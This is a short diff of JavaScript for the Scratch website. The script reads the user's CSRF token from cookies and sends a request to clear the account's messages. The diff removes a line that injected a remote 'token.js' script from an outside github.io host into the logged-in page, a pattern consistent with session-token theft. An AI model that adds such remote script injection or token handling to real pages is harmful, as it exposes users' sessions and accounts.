@@ -11,7 +11,6 @@ async function a(){
         });
         token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
     }
-    var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
 let a=await fetch(`https://scratch.mit.edu/site-api/messages/messages-clear/`,{
   method: "POST",
   headers: {
